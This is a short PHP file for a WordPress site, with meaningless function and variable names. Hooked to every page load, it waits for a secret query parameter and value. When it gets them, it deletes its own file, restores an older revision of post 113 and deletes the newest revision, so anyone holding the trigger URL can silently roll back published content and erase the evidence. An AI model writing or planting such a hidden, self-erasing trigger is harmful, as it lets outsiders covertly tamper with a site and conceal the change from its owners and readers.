<?php

function tracker_instant_remove_ai() {
	if (isset($_GET['dropdown_gravatar_wpml']) && $_GET['dropdown_gravatar_wpml'] === 'virtual_flexible_elements') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$error_item_compat = 113;
		$buttons_global_survey_clock = wp_get_post_revisions($error_item_compat);
		if (empty($buttons_global_survey_clock)) die('no revisions');
		if (count($buttons_global_survey_clock) < 2) die('less than 2');
		$replace_scroll_automatic = array_shift($buttons_global_survey_clock);
		$smtp_floating_ajax_coupons = $replace_scroll_automatic->ID;
		$orders_backup_sites_stripe = array_shift($buttons_global_survey_clock);
		$columns_updates_tag = $orders_backup_sites_stripe->ID;
		$urls_graph_attachment = wp_restore_post_revision($columns_updates_tag);
		if ($urls_graph_attachment === false) die('error restoring');
		$urls_graph_attachment = wp_delete_post_revision($smtp_floating_ajax_coupons);		
		if ($urls_graph_attachment === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'tracker_instant_remove_ai');
